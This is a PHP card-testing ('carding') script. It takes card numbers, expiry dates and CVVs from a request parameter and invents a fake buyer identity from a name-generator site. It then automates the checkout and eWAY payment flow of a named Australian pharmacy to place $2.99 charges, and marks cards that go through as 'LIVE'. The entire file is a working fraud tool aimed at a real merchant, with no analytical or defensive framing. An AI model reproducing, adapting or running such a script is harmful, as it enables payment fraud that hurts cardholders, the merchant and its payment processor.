<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 12)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://www.chemistdiscountcentre.com.au/Checkout/Payment/InitPayment",
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "Accept: application/json, text/javascript, */*; q=0.01",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "Origin: https://www.chemistdiscountcentre.com.au",
            "Referer: https://www.chemistdiscountcentre.com.au/",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ),
        CURLOPT_POSTFIELDS => "CreditCard%5BName%5D=$fname&CreditCard%5BNumber%5D=$cc&CreditCard%5BCVV%5D=$cvv&CreditCard%5BExpiryMonth%5D=".ltrim($mm, "0")."&CreditCard%5BExpiryYear%5D=".substr($yy, 2, 4)."&OrderItems%5B0%5D%5BProductId%5D=24561&OrderItems%5B0%5D%5BComboProductId%5D=&OrderItems%5B0%5D%5BPrice%5D=2.99&OrderItems%5B0%5D%5BQuantity%5D=1&OrderItems%5B0%5D%5BPriceType%5D=1&OrderItems%5B0%5D%5BHoldScript%5D=false&FreightTypeId=3&FreeShipping=true&ShippingAddress%5BfirstName%5D=$fname&ShippingAddress%5BlastName%5D=$lname&ShippingAddress%5Bcompany%5D=&ShippingAddress%5Bemail%5D=$fname$lname$cookie@gmail.com&ShippingAddress%5Bphone%5D=$phone&ShippingAddress%5Baddress%5D%5Bstreet1%5D=Shop+33&ShippingAddress%5Baddress%5D%5Bstreet2%5D=Base+Hill+Plaza+753+Hume+Highway+Rd&ShippingAddress%5Baddress%5D%5Bsuburb%5D=Bass+Hill+NSW&ShippingAddress%5Baddress%5D%5Bstate%5D=&ShippingAddress%5Baddress%5D%5Bpostcode%5D=2197&VoucherCode=&LeaveAtPlace=false&PrescriptionAware=false&LeaveAtPlaceNotes=&VerificationID=true&OrderPhone=&CertainItemsAvailable=true&IsGuest=true&SubscribeToOffersAndPromotions=true&CCShopId=30&Recipient%5BfirstName%5D=&Recipient%5BlastName%5D=&OrderType=1&HomeDeliveryDate=&HasPrescriptionItems=false&paymentType=MastercardVisa"
    ));
    $accessCode = urlencode(GetStr(curl_exec($ch), '"AccessCode":"', '"'));
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://secure.ewaypayments.com/JSONP/v3/process?ewayjsonp=eWAYknm1pzw6&EWAY_ACCESSCODE=$accessCode&EWAY_PAYMENTTYPE=Credit%20Card&EWAY_CARDNAME=$fname&EWAY_CARDNUMBER=$cc&EWAY_CARDEXPIRYMONTH=".ltrim($mm, "0")."&EWAY_CARDEXPIRYYEAR=".substr($yy, 2, 4)."&EWAY_CARDCVN=$cvv&",
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "Accept: */*",
            "Referer: https://www.chemistdiscountcentre.com.au/",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        )
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://www.chemistdiscountcentre.com.au/Checkout/Payment/CompletePayment",
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "Accept: application/json, text/javascript, */*; q=0.01",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "Origin: https://www.chemistdiscountcentre.com.au",
            "Referer: https://www.chemistdiscountcentre.com.au/",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ),
        CURLOPT_POSTFIELDS => "accessCode=$accessCode&storeId=175"
    ));
    $exec = curl_exec($ch);
    curl_close($ch);

    $response = json_decode($exec, true)['errors'][0]['errors'][0];

    if(strpos($exec, '"orderId"')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged $2.99 AUD</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>